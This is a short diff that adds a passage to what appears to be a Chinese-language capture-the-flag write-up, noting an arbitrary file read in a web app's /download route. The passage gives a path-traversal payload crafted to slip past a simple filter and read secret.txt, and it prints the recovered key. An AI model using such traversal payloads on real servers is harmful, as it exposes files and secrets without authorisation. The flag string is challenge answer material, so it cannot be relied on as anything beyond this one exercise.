@@ -45,3 +45,8 @@ run(host='0.0.0.0', port=8080, debug=False)
 
 
 ```
+看到`/download`路由存在任意读取，小waf我们绕一下：
+```http
+?filename=./.././.././.././secret.txt
+```
+得到密钥：`Hell0_H@cker_Y0u_A3r_Sm@r7`
